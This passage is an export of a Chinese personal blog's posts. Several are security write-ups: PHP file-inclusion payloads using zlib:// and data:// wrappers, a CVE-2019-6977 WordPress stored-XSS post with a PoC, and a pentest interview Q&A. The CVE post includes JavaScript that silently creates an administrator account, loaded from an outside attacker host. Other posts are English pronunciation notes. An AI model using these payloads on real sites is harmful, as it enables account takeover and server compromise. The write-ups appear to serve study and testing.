<h3 id="zlib"><a href="#zlib" class="headerlink" title="zlib://"></a>zlib://</h3><p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib://[压缩包文件相对路径]?file=compress.zlib://[压缩包文件绝对路径]</span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong>：php &gt;= 5.2</p>
<p><strong>利用姿势1</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=compress.zlib://head.gz</span><br><span class="line">index.php?file=compress.zlib://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.gz</span><br></pre></td></tr></table></figure>

<p><strong>利用姿势2</strong>：</p>
<p>利用协议特性，更改后缀文件可适当绕过一些限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=compress.zlib://head.jpg</span><br><span class="line">index.php?file=compress.zlib://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.jpg</span><br></pre></td></tr></table></figure>



<h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>数据流封装器，和php://相似都是利用了流的概念</p>
<p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:,&lt;文本数据&gt; data:text/plain,&lt;文本数据&gt;data:text/html,&lt;HTML代码&gt;data:text/html;base64,&lt;base64编码的HTML代码&gt;data:text/css,&lt;CSS代码&gt;data:text/css;base64,&lt;base64编码的CSS代码&gt;data:text/javascript,&lt;Javascript代码&gt;data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;data:image/gif;base64,base64编码的gif图片数据data:image/png;base64,base64编码的png图片数据data:image/jpeg;base64,base64编码的jpeg图片数据data:image/x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php &gt;= 5.2allow_url_fopen = Onallow_url_include = On</span><br></pre></td></tr></table></figure>

<p><strong>利用姿势1</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">index.php?file=data://text/plain,&lt;?php phpinfo();</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>著名绿眼逻辑谜题</title>
    <url>/2020/05/10/%E8%91%97%E5%90%8D%E7%BB%BF%E7%9C%BC%E9%80%BB%E8%BE%91%E8%B0%9C%E9%A2%98/</url>
    <content><![CDATA[<p><strong>keyword：多读书多看报，少吃零食多睡觉</strong></p>
<span id="more"></span> 

<iframe src="https://xbeibeix.com/api/bilibili/biliplayer/?url=BV19f4y1m7Mp" allowfullscreen="allowfullscreen" width="100%" height="638" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
        <category>英语</category>
        <category>反省</category>
        <category>TED</category>
      </categories>
      <tags>
        <tag>思考</tag>
        <tag>喜欢</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-6977</title>
    <url>/2020/05/10/CVE-2019-6977/</url>
    <content><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>此漏洞为存储型XSS，存在于WordPress 5.0到5.0.4,5.1和5.1.1版本</p>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>存在的地方为文章写入的地方</p>
<img src="https://ckcah.github.io/images/CVE-2019-6977/1.png">

<p>Poc</p>
<p><code>&quot;&gt;&lt;img src=1 onerror=alert(&quot;bosch&quot;)&gt;</code></p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>结果</p>
<img src="https://ckcah.github.io/images/CVE-2019-6977/2.png">

<p>如果被攻击者恰好拥有管理员权限，则攻击者即可以利用此漏洞获取管理员帐户的控制权，利用WordPress内置函数 getShell，然后控制服务器</p>
<h2 id="0x00-1"><a href="#0x00-1" class="headerlink" title="0x00"></a>0x00</h2><p>攻击者可以在其Web服务器上托管JavaScript文件</p>
<p>此JavaScript代码将添加一个WordPress管理员帐户,账号密码为bosch</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Send a GET request to the URL &#x27;/wordpress/wp-admin/user-new.php&#x27;, and extract the current &#x27;nonce&#x27; value  </span><br><span class="line">var ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">var requestURL = &quot;/wordpress/wp-admin/user-new.php&quot;;  </span><br><span class="line">var nonceRegex = /ser&quot; value=&quot;([^&quot;]*?)&quot;/g;  </span><br><span class="line">ajaxRequest.open(&quot;GET&quot;, requestURL, false);  </span><br><span class="line">ajaxRequest.send();  </span><br><span class="line">var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);  </span><br><span class="line">var nonce = nonceMatch[1];  </span><br><span class="line"></span><br><span class="line">// Construct a POST query, using the previously extracted &#x27;nonce&#x27; value, and create a new user with an arbitrary username / password, as an Administrator  </span><br><span class="line">var params = &quot;action=createuser&amp;_wpnonce_create-user=&quot;+nonce+&quot;&amp;user_login=bosch&amp;email=bosch@site.com&amp;pass1=bosch&amp;pass2=bosch&amp;role=administrator&quot;;  </span><br><span class="line">ajaxRequest = new XMLHttpRequest();  </span><br><span class="line">ajaxRequest.open(&quot;POST&quot;, requestURL, true);  </span><br><span class="line">ajaxRequest.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);  </span><br><span class="line">ajaxRequest.send(params);</span><br></pre></td></tr></table></figure>

<p>然后攻击者可以在JavaScript中注入以下PoC代码</p>
<p><code>&quot;&gt;&lt;img src=1 onerror=&quot;javascript:(function () &#123; var url = &#39;http://aaa.bbb.ccc.ddd/ wpaddadmin.js&#39;;if (typeof beef == &#39;undefined&#39;) &#123; var bf = document.createElement(&#39;script&#39;); bf.type = &#39;text/javascript&#39;; bf.src = url; document.body.appendChild(bf);&#125;&#125;)();&quot;&gt;</code></p>
<p>分析过程：</p>
<p>添加成功，进行查看</p>
<img src="https://ckcah.github.io/images/CVE-2019-6977/4.png">



<p>直接查看后台user，可以看到添加成功</p>
<img src="https://ckcah.github.io/images/CVE-2019-6977/5.png">



<h2 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h2><p>也可以在攻击者的帐户添加webshell</p>
<img src="https://ckcah.github.io/images/CVE-2019-6977/3.png"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>web安全</category>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>英语连读积累</title>
    <url>/2020/05/09/%E8%8B%B1%E8%AF%AD%E8%BF%9E%E8%AF%BB%E7%A7%AF%E7%B4%AF%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    <content><![CDATA[<p><strong>5.9</strong></p>
<p>Dunno  =  Don’t know  </p>
<p>Gotta    =  Got to   </p>
<p>Lemme  =  Let me  </p>
<p>Wanna  =  Want to   </p>
<p>Gonna   =  Going to   </p>
<p>Gimme  =  Give me  </p>
<p>Shoulda=  Should have  </p>
<p>Coulda  =  Could have  </p>
<p>Innit      =  Isn’t it  </p>
<p>Ain’t      =  Is not or are not</p>
<p><strong>5.11</strong></p>
<p>hangin’ out = hanging out</p>
<p>movin’ on = Moving on</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习英语的漫长历程</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title>川普教你说话的艺术</title>
    <url>/2020/05/09/%E5%B7%9D%E6%99%AE%E6%95%99%E4%BD%A0%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/</url>
    <content><![CDATA[<p><strong>转载于<a href="https://www.bilibili.com/video/BV1Xa4y1v7US">https://www.bilibili.com/video/BV1Xa4y1v7US</a></strong></p>
<iframe src="https://xbeibeix.com/api/bilibili/biliplayer/?url=BV1Xa4y1v7US" allowfullscreen="allowfullscreen" width="100%" height="638" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"></iframe>



<p>词汇总结：</p>
<p><strong>sporadic</strong></p>
<p>零散的（地域上）</p>
<p>断断续续的（时间上）</p>
<p><strong>administration</strong></p>
<p>政府</p>
<p>可以指某一段具体时间的政府</p>
<p>也可以理解为某一届的政府</p>
<hr>
<p><strong>补充</strong></p>
<p>小川普上任这么久了，没有功劳也有苦恼，我就还是不怼（主要还是怕说错话，哈哈哈），其他方面不说，十几秒概述两个重点这个，是该值得学习的语言魅力！！</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>English</category>
        <category>自我修养</category>
      </categories>
      <tags>
        <tag>English</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透驻场面试经验分享</title>
    <url>/2020/05/09/%E6%B8%97%E9%80%8F%E9%A9%BB%E5%9C%BA%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>转载于：<a href="https://mp.weixin.qq.com/s/EkDEwnmQIlrnWUqi-e6I9Q">https://mp.weixin.qq.com/s/EkDEwnmQIlrnWUqi-e6I9Q</a></strong></p>
<p>最近接到一个渗透测试驻场项目。几位同事去面试了下，下面对面试的问题进行一个汇总。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.json的csrf的利用</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.小程序的渗透和普通渗透的差异</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.app本身的漏洞测试 四大组件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.业务上线前，怎么测试，从哪些角度测试</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5.java应用上传漏洞利用,如何绕过</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6.应用有漏洞，但是无法修复和停用，你怎么办</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.cookie你会测试什么内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.用户登录你会测试哪些内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9.你审计java代码挖到的漏洞，怎么挖的，怎么修复的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10.如果开发通过加referer的方式修复csrf，怎么判断这个referer是不是有效</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">11.json格式的数据包可以测哪些漏洞</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">12.如果网站评论区的复选框存在xss，怎么修复</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">13.绕过验证码有哪些思路</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">14.除了各种服务的未授权，网站的未授权怎么测</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">15.关于会话你会测哪些内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">16.文件上传</span><br></pre></td></tr></table></figure>

<span id="more"></span> 



<p><strong>01 json的csrf的利用和防御</strong></p>
<p>攻击：</p>
<p>1）服务器只接受</p>
<p>Content-Type: application/json的包文</p>
<p>2）POSTbody需要以JSON格式发送,可以使用XHR、fetch来实现csrf</p>
<p>防御：</p>
<p>1）用户操作验证，在提交数据时需要输入验证码</p>
<p>2）请求来源验证，验证请求来源的referer</p>
<p>3）表单token验证（令牌）</p>
<p><strong>02 小程序的渗透和普通渗透的差异</strong></p>
<p>1）微信小程序的包储存在本地的，只要是访问过微信小程序，他的包自动下载到本地</p>
<p>把wxapkg包下载到了本地，然后下载个解包工具，就可以得到小程序前端的代码</p>
<p>2）Proxifier代理客户端 安卓模拟器全局代理</p>
<p>3）常见支付宝和微信中</p>
<p>ios:推荐抓包工具Stream、网络三件套</p>
<p>安卓:推荐抓包工具package capture</p>
<p>4）小程序未进行https证书强校验，所以用安卓手机配合burp即可进行抓包。</p>
<p>如果小程序开启了https证书强校验，那我们就需要hook微信或者反编译小程序后替换证书</p>
<p>5）微信pc端测试版</p>
<p><a href="https://dldir1.qq.com/weixin/Windows/Beta/WeChat2.9.0_Beta.exe">https://dldir1.qq.com/weixin/Windows/Beta/WeChat2.9.0_Beta.exe</a></p>
<p>6）在线扫描</p>
<p><a href="https://wetest.qq.com/console/miniapp/scan">https://wetest.qq.com/console/miniapp/scan</a></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/ZWDfQrMFWoKicgNPCiaBE2tHJmDD4T57jKn0BAkwB9RawcGtxf1EL7O1SL4Ls0AoFF9IL847wFavD4G3CdrwBY7Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p>
<p><strong>03 app本身的漏洞测试 四大组件</strong></p>
<p>1）APP面临的主要风险可以分为客户端风险和服务端风险。</p>
<p>  a. 客户端风险</p>
<p>  传统逆向分析类（反编译、调试、四大组件漏洞、加密/签名破解…）</p>
<p>  用户已经中招类（输入记录、导出组件、进程注入…）。</p>
<p>  b. 服务端风险</p>
<p>  系统组件类（MS12-020、ShellShock、心血、ST2…）</p>
<p>  业务应用类（注入跨站越权执行上传下载弱口令…）。</p>
<p>2）安卓系统的四大组件：</p>
<p>  Activity：呈现可供用户交互的界面，是最常见的组件；</p>
<p>  Service：长时间执行后台作业，常见于监控类应用；</p>
<p>  ContentProvider：在多个APP间共享数据，比如通讯录；</p>
<p>  BroadcastReceiver：注册特定事件，并在其发生时被激活</p>
<p>组件测试工具-drozer</p>
<p><strong>04 业务上线前，怎么测试，从哪些角度测试</strong></p>
<p>   在测试环境下,根据测试类型（web、APP、小程序、公众号）进行测试</p>
<p>按功能点进行测试。</p>
<p>1)黑盒:按照功能点的划分进行测试,OWASP TOP 10,checklist</p>
<p>2)白盒:代码审计</p>
<p>3)灰盒</p>
<p><strong>05 java应用上传漏洞利用,如何绕过</strong></p>
<p>1）客户端绕过</p>
<p>2）服务端绕过</p>
<p>  a. 文件类型绕过</p>
<p>  b. 文件头绕过</p>
<p>  c. 文件后缀名绕过</p>
<p>3）配合文件包含漏洞</p>
<p>4）配合服务器解析漏洞</p>
<p>5）配合操作系统文件命令规则</p>
<p>6）CMS、编辑器漏洞</p>
<p>7）配合其他规则</p>
<p>8）WAF绕过</p>
<p>  a. 垃圾数据</p>
<p>  b. filename</p>
<p>  c. POST/GET</p>
<p>  d. 利用waf本身缺陷</p>
<p><strong>06 应用有漏洞，</strong></p>
<p><strong>但是无法修复和停用，****你怎么办</strong></p>
<p>1）上安全设备，如waf</p>
<p>2） ACL</p>
<p>3）临时性补丁</p>
<p>4）加认证</p>
<p>5）二次封装</p>
<p><strong>07 cookie你会测试什么内容</strong></p>
<p>1）字段分析, 递减到剩下关键的鉴别字段</p>
<p>2）算法分析, JWT等等</p>
<p>3） 注入类测试，sql注入</p>
<p>4） xss</p>
<p>5） 反序列化</p>
<p><strong>08 用户登录你会测试哪些内容</strong></p>
<p>1）明确登陆涉及的接口,顺序和关系</p>
<p>2）针对顺序可能涉及, 多重认证绕过bypass</p>
<p>3）针对接口,可以涉及注入类,url跳转,用户名枚举,验证码失效问题, 弱口令</p>
<p>  a. 注入也可以二次注入 （万能密码）</p>
<p>  b.xss</p>
<p>  c.  短信炸弹</p>
<p>  d.验证码爆破</p>
<p>  e.验证邮箱或短信绕过</p>
<p>  f.找回密码处跳过验证 等等</p>
<p><strong>09 你审计java代码挖到的漏洞，</strong></p>
<p><strong>怎么挖，怎么修复</strong></p>
<p>  Java代码审计可以发现的漏洞分为两类：</p>
<p>1） 程序员由于编码不当产生的漏洞，典型包括后门、SQL注入、文件上传、任意文件下载、接口非授权访问、垂直越权。对于水平越权、XSS、CSRF、逻辑类漏洞也可以检测；</p>
<p>2）第三方组件使用不当产生的漏洞，从POM文件中可以找到使用了低版本的组件。从应用配置文件中可以找到配置不当问题。</p>
<p>Fortify SCA扫描</p>
<p><strong>10 如果开发通过加referer的方式修复csrf，</strong></p>
<p><strong>怎么判断referer是不是有效</strong></p>
<p>  总而言之, 先明确这个接口从referer取出了什么值, 那么对这个值有怎样的校验逻辑：</p>
<p>1）利用ftp://,http://,https://,file://,javascript:,data</p>
<p>2）判断Referer是某域情况下绕过 referer: </p>
<p><a href="http://www.xxx.com@www.baidu.com/">www.xxx.com@www.baidu.com</a></p>
<p>3）判断Referer是否存在某关键词</p>
<p>4）判断referer是否有某域名</p>
<p><strong>11 json格式的数据包可以测哪些漏洞</strong></p>
<p>敏感信息泄漏</p>
<p>注入</p>
<p>XSS</p>
<p>CSRF</p>
<p>xxe</p>
<p><strong>12 如果网站评论区的复选框存在xss,</strong></p>
<p><strong>怎么修复</strong></p>
<p>xss修复从3个角度</p>
<p>1）httponly cookie</p>
<p>2）输入检查 参数的位置 限制住输入的点</p>
<p>3）输出编码 实体化</p>
<p><strong>13 绕过验证码有哪些思路</strong></p>
<p>1）爆破</p>
<p>2）前端校验</p>
<p>3）生成的验证码会在请求包，前端生成性, 写出对应算法即可</p>
<p>4）万能验证码 000000 888888 8888888</p>
<p>5）删除验证码字段</p>
<p>6）不刷新</p>
<p>7）验证码可识别</p>
<p><strong>14 除了各种服务的未授权，</strong></p>
<p><strong>网站的未授权怎么测</strong></p>
<p>目前主要服务存在未授权访问漏洞的有：</p>
<p>NFS服务、Samba服务、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcached、CouchDB、Docker、Solr、Hadoop、Dubbo、JBOSS 、VNC</p>
<p>网站的未授权</p>
<p>1）字典枚举</p>
<p>2）JS/HTML接口提取</p>
<p>JSFinder  <a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>英语国际音标</title>
    <url>/2020/05/08/%E8%8B%B1%E8%AF%AD%E5%9B%BD%E9%99%85%E9%9F%B3%E6%A0%87/</url>
    <content><![CDATA[<p><strong>元音（20个）</strong><br>长元音 /ɑ:/ /ɔ:/ / ɜ:/ /i:/ /U:/ /e/<br>短元音 / ʌ/ /ɒ/ /ə/ /ɪ/ /ʊ/ /e/ /æ/ /eɪ/ /aɪ/ /ɔɪ/ /ɛ/<br>双元音 /ɪə/ /eə/ /ʊə/ /əʊ/ /aʊ/</p>
<p><strong>辅音（28个）</strong><br>清辅音 /p/ / t/ / k/ /f/ /θ/ /s/<br>浊辅音 /b/ /d/ /g/ /v/ /ð/ /z/<br>清辅音 /ʃ/ / h/ /ts/ /tʃ/ /tr/<br>浊辅音 /ʒ/ / r/ /dz/ /dʒ/ /dr/<br>鼻音 /m/ /n/ /ŋ/<br>半元音 / j/ / w/<br>边音 / ǀ/</p>
<h2 id="新旧英语国际音标对照表"><a href="#新旧英语国际音标对照表" class="headerlink" title="新旧英语国际音标对照表"></a>新旧英语国际音标对照表</h2><p>Vowels元音 新 i: І e æ З: ə Λ u: ʊ ɔ:<br>旧 i: i e æ ə: ə Λ u: u ɔ:<br>新 ɒ ɑ: eI aI ɔI əʊ aʊ Iə eə ʊə<br>旧 ɔ ɑ: ei ai ɔi əu au iə εə uə<br>备注：辅音新旧无变化。</p>
<p>英语音标及字母组合对照<br>1.元音</p>
<ol>
<li>[i:] 字母组合:ee ea e ie ei ey<br>单词举例：three[θri:]三 tree[tri:]树 green[griːn]绿色 sheep[ʃiːp]羊<br>meet[miːt]遇见 bee[biː]蜜蜂 see[si:]看<br>eat tea meat leave leaf teacher speak<br>吃 茶 肉 离开 树叶 教师 说话<br>clean please he she me piece receive<br>干净的 请 他 她 我 块 收到</li>
<li>[ I ] [i] 发音字母: i y e ui u ey<br>单词举例：sit [sit] pig [piɡ] big [biɡ] it [it] is [iz] fish [fiʃ] busy [‘bɪzɪ]<br>坐 猪 大的 它 是 鱼 忙的<br>many happy dictionary money<br>许多的 快乐的 字典 钱</li>
<li>[ æ ] 发音字母: a<br>单词举例：bag [[bæɡ]] hand [hænd] happy [‘hæpi] hat [hæt] map [mæp] bad [bæd]<br>书包 手 快乐的 帽子 地图 坏的<br>black back dad man at<br>黑色 后面 爸爸 男人 在</li>
<li>[e] 字母组合: ea e a ai<br>单词举例head [hed] bread [bred] bell [bel] leg [leg] egg [eg] remember [ri’membə]<br>头 面包 钟 腿 蛋 记得<br>Pen lesson better desk hotel yes<br>钢笔 功课 更好的 书桌 旅馆 是</li>
<li>[З:] ə: 字母组合: ir ur ear er or<br>单词举例：girl [ɡə:l] shirt [ʃɜːt] skirt [skə:t] thirty [‘θə:ti] third [θə:d] bird [bɜːd]<br>女孩 衬衫 裙子 三十 第三 小鸟</li>
</ol>
<p>turn nurse turtle Thursday learn earth term her work world<br>转动 护士 海龟 星期四 学习 地球 学期 她的 工作 世界<br>6) [ə] 字母组合 er or ar o a ur<br>单词举例：teacher [‘ti:tʃə] remember [ri’membə] mother [‘mʌðə] father [‘fɑ:ðə]<br>教师 记得 妈妈 爸爸<br>doctor actor author familiar dollar panda picture together tomorrow<br>医生 男演员 作家 熟悉的 美元 熊猫 图画 一起 明天<br>today lesson around ago panda banana<br>今天 功课 周围 以前的 熊猫 香蕉<br>7) [a:] 字母组合: ar a au<br>单词举例：ca r [kɑ:] farm[fɑ:m] laugh[lɑ:f] park[pɑ:k] star[stɑ:]<br>小汽车 农场 笑 公园 星<br>fast class glass grass aunt<br>快速的 班级 眼镜 草 姑妈<br>[ ʌ ] 发音字母: u o ou oo<br>单词举例：sun[sʌn] but[bʌt] run[rʌn] luck[lʌk] cup[kʌp] bus[bʌs]<br>太阳 但是 跑 运气 杯子 公共汽车<br>come mother love above trouble blood flood<br>来 妈妈 爱 上面的 烦恼 血 淹没<br>9) [ɔ: ] 字母组合: al or au our ar oor a<br>单词举例：small[smɔ:l] wall[wɔ:l] talk[tɔ:k] tall[tɔ:l] ball[bɔːl] walk[wɔːk]<br>小的 墙壁 讲 高的 球 走<br>short more horse for forty sport author autumn caught four warm<br>短的 更多的 马 为了 四十 运动 作家 秋天 捉住 四 暧和的<br>floor door water<br>地面 门 水<br>10) [ ɔ ] ([ɒ]) 发音字母: o a<br>单词举例：on[ɔn] hot[hɔt] fox[fɒks] dog[dɔɡ] shop[ʃɔp] stop[stɔp]<br>在…上面 热的 狐狸 狗 商店 停止<br>want wash watch<br>想要 洗 看<br>11) [u:] 字母组合: oo o u oe ui<br>单词举例：food[fu:d] room[ru:m] tooth[tu:θ] school[sku:l] moon [mu:n]<br>食物 房间 牙齿 学校 月球<br>shoe do two true blue ruler<br>鞋 做 二 真实的 蓝色 尺</p>
<ol>
<li>[u] 字母组合: u oo ou<br>单词举例： put[put] full[ful] push[puʃ] look good foot book wood<br>放,摆 全部 推 看 好 足 书 木头<br>should could cook move<br>应该 能 煮 移动</li>
<li>[ei] 发音字母 a ay ea ai ey<br>单词举例： name[neim] cake[keik] age[eidʒ] plane[plein] April[‘eiprəl]<br>名字 蛋糕 年龄 飞机 四月<br>play say may way day lake great break they grey game<br>玩 说 可以 路 天 湖 重大的 打破 他们 灰色 游戏<br>rain paint plain<br>雨 油漆 普通的</li>
<li>[ai] 发音字母 i y<br>单词举例：Bike[baik] kite[kait] rice[rais] find[faind] light[‘lait] night[nait]<br>自行车 风筝 米 发现 灯 夜晚<br>my try fly eye knife time<br>我的 试 飞行 眼睛 刀 时间</li>
<li>[au] 字母组合： ou ow<br>单词举例：house[haus] out[aut] mouth[mauθ] sound[saund] mouse[maus]<br>房子 外面的 口 声音 鼠<br>blouse flower down now cow how<br>上衣 花 在下面 现在 母牛 多么<br>[əʊ] [əu] 发音字母: o ow oa<br>单词举例: home[həum] cold[kəuld] go[ɡəu] hope[həup] nose[nəuz]<br>家 寒冷的 走 希望 鼻子<br>know low below grow bowl boat coat goal</li>
</ol>
<p>知道 低的 在…下面 生长 碗 小船 外套 目的<br>17) [ ɔɪ ][ɔi] 字母组合: oy oi<br>单词举例: boy[bɔi] toy[tɔi] oil[ɔil] voice[vɔis] choice[tʃɔis]<br>男孩 玩具 油 声音 选择<br>18) [Iə] [iə] 字母组合： eer ear<br>单词举例：beer[biə] year [jiə] ear[iə] near[niə] idea[ai’diə]<br>啤酒 年龄 耳朵 在….近旁 主意<br>[ɛə][eə] 字母组合: ear air ere<br>单词举例：pear[pεə] bear[bεə] chair[tʃεə] air[εə] there where<br>梨子 熊 椅子 空气 在那里 在哪里<br>care pair hair<br>注意 一双 头发<br>20) [ʊə][uə] 字母组合: ure oor our<br>单词举例：sure[ʃuə] poor[puə] tour[tuə]<br>当然 贫穷的 旅行<br>2、辅音<br>清辅音:<br>\21. [ p ] 字母组合: p<br>单词举例：pen[pen] pig[piɡ] paper[‘peipə] play[plei] apple[‘æpl]<br>钢笔 宠物 纸 玩 苹果<br>\22. [ t ] 字母组合: t<br>单词举例： boat[bəut] table[‘teibl] coat[kəut] goat[ɡəut] talk[tɔ:k]<br>小船 桌子 外套 山羊 谈话<br>\23. [ k ] 字母组合: k c ck<br>单词举例：kite[kait] king[kiŋ] kitchen[‘kitʃin] can[kæn] car[kɑ:] cake[keik]<br>风筝 国王 厨房 能 小汽车 蛋糕<br>lock cup key milk cook<br>锁 杯 钥匙 牛奶 煮<br>\24. [ f ] 字母组合: f ph gh<br>单词举例： fox[fɔks] fish[fiʃ] laugh[lɑ:f] photo[‘fəutəu] elephant[‘elifənt]<br>狐狸 鱼 笑 照片 象<br>\25. [ θ ] 字母组合: th<br>单词举例：thin[θin] thank[θæŋk] three[θri:]<br>瘦的 感谢 三<br>\26. [ s ] 字母组合: s c ss ce<br>单词举例：six[siks] sing[siŋ] snow[snəu] cinema[‘sinəmə] city[‘siti]<br>六 唱 雪 电影院 城市<br>\27. [ ts ] 字母组合: ts<br>单词举例：hats cats coats boats students<br>帽子 猫 外衣 小船 学生<br>\28. [ tr ] 字母组合: tr<br>单词举例： tree[tri:] train[trein] try[trai] trousers[‘trauzə]<br>树 火车 试 裤子<br>\29. [ ʃ ] 字母组合: sh s<br>单词举例： ship[ʃip] shoe[ʃu:] shop[ʃɔp] short[ʃɔ:t]<br>船 鞋 商店 短的<br>\30. [ tʃ ] 字母组合: ch<br>单词举例： chair[tʃεə] chicken[‘tʃikin] chinese[,tʃai’ni:z] watch[wɔtʃ]<br>椅子 小鸡 中国人 观看</p>
<ol>
